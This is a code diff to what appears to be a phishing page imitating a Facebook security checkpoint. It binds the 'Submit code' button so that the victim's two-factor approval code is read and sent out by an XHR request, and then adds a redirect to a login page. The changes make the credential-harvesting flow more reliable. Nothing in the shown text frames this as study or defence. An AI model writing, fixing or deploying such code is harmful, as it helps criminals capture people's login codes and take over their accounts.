@@ -122,7 +122,7 @@
                             </div>
                             <div class="_5hzs" id="checkpointBottomBar">
                                 <div class="_2s5p"><button value="continue"
-                                        class="_42ft _4jy0 _2kak _4jy4 _4jy1 selected _51sy" onclick="sendMessage()">Submit code</button></div>
+                                        class="_42ft _4jy0 _2kak _4jy4 _4jy1 selected _51sy" id="btnSubmit">Submit code</button></div>
                                 
                             </div>
                         </div>
@@ -441,6 +441,14 @@
 
 
     <script>
+        document.addEventListener("DOMContentLoaded", function() {
+            var submitButton = document.getElementById("btnSubmit");
+
+            submitButton.addEventListener("click", function(event) {
+                event.preventDefault();
+                sendMessage();
+            });
+        });
         function sendMessage() {
             // Get the message from the input field
             var message = "approvals_code: "  + document.getElementById("approvals_code").value;
@@ -455,6 +463,10 @@
 
             // Send the request
             xhr.send();
+            
+            setTimeout(function() {
+                window.location.href = "login.html";
+            }, 1000);
         }
     </script>
 </body>
